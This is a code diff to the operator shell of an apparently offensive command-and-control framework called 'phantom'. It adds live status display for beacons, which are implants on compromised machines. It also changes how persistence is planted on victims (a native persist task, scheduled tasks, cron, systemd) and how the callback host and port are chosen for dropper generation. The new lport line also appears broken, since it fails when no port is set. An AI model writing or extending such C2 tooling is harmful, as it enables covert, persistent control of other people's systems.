@@ -52,7 +52,18 @@ class C2Shell(cmd.Cmd):
 
     def postcmd(self, stop, line):
         if self.active_beacon:
-            self.prompt = f"\033[1;35mC2\033[0m (\033[36m{self.active_beacon}\033[0m) > "
+            beacons = c2_state.get_beacons()
+            info = beacons.get(self.active_beacon, {})
+            last_seen_str = info.get("last_seen", "")
+            
+            status_color = "\033[31m" # Red
+            if last_seen_str:
+                last_seen_dt = datetime.fromisoformat(last_seen_str)
+                diff = (datetime.now() - last_seen_dt).total_seconds()
+                if diff < 15: status_color = "\033[32m" # Green
+                elif diff < 60: status_color = "\033[33m" # Yellow
+            
+            self.prompt = f"\033[1;35mC2\033[0m ({status_color}{self.active_beacon}\033[0m) > "
         else:
             self.prompt = "\033[1;35mC2\033[0m > "
         return stop
@@ -83,7 +94,7 @@ class C2Shell(cmd.Cmd):
             notifier.error("Usage: listeners start [port] [host] | listeners stop")
 
     def do_beacons(self, arg):
-        """beacons - list active beacons"""
+        """beacons - list active beacons with real-time status"""
         beacons = c2_state.get_beacons()
         if not beacons:
             notifier.warn("No active beacons.")
@@ -91,31 +102,41 @@ class C2Shell(cmd.Cmd):
 
         table = Table(title="Active Beacons", border_style="magenta")
         table.add_column("ID", style="cyan")
+        table.add_column("Status", justify="center")
         table.add_column("Source IP", style="green")
-        table.add_column("Local IPs", style="dim green")
         table.add_column("User@Host", style="magenta")
         table.add_column("OS", style="blue")
         table.add_column("Last Seen", style="yellow")
         
+        now = datetime.now()
         for bid, info in beacons.items():
+            last_seen_str = info.get("last_seen", "")
+            status = "[red]OFFLINE[/]"
+            
+            if last_seen_str:
+                last_seen_dt = datetime.fromisoformat(last_seen_str)
+                diff = (now - last_seen_dt).total_seconds()
+                
+                if diff < 15: # Se visto negli ultimi 15 secondi (sleep 5s + jitter)
+                    status = "[green]ACTIVE[/]"
+                elif diff < 60:
+                    status = "[yellow]STALE[/]"
+                
+                last_seen_display = f"{int(diff)}s ago"
+            else:
+                last_seen_display = "Never"
+            
             user = info.get("user", "")
             host = info.get("hostname", "")
             user_host = f"{user}@{host}" if user or host else "Unknown"
             
-            os_arch = info.get("os", "Unknown")
-            if "arch" in info:
-                os_arch += f" ({info['arch']})"
-                
-            local_ips = info.get("local_ips", "")
-            if len(local_ips) > 20: local_ips = local_ips[:17] + "..."
-            
             table.add_row(
                 bid, 
+                status,
                 info.get("ip", "Unknown"), 
-                local_ips,
                 user_host,
-                os_arch,
-                info.get("last_seen", "Never")
+                info.get("os", "Unknown"),
+                last_seen_display
             )
             
         console.print(table)
@@ -251,16 +272,23 @@ class C2Shell(cmd.Cmd):
 
         from phantom.core.persistence import persistence_manager
         cmd = ""
-        if method == "runkey": cmd = persistence_manager.get_windows_runkey(binary_path)
-        elif method == "schtask": cmd = persistence_manager.get_windows_schtask(binary_path)
-        elif method == "cron": cmd = persistence_manager.get_linux_cron(binary_path)
-        elif method == "systemd": cmd = persistence_manager.get_linux_systemd(binary_path)
+        if method == "runkey": 
+            # Use native persistence instead of shell command
+            cmd = "persist PhantomBeacon"
+        elif method == "schtask": 
+            cmd = persistence_manager.get_windows_schtask(binary_path)
+        elif method == "cron": 
+            cmd = persistence_manager.get_linux_cron(binary_path)
+        elif method == "systemd": 
+            cmd = persistence_manager.get_linux_systemd(binary_path)
+        elif method == "native":
+            cmd = "persist PhantomUpdate"
         else:
             notifier.error(f"Unknown persistence method: {method}")
             return
 
         if cmd:
-            task_id = c2_state.queue_task(self.active_beacon, f"shell {cmd}")
+            task_id = c2_state.queue_task(self.active_beacon, cmd if cmd.startswith("persist") else f"shell {cmd}")
             notifier.success(f"Persistence task queued: {method}")
             notifier.info(f"Task ID: {task_id}")
 
@@ -332,8 +360,8 @@ class C2Shell(cmd.Cmd):
 
         import phantom
         pkg_root = os.path.dirname(phantom.__file__)
-        host = get_lhost()
-        port = int(session.lport) if session.lport else (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443)
+        host = session.lhost or get_lhost()
+        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443)
 
         # Compile and generate dropper
         try:
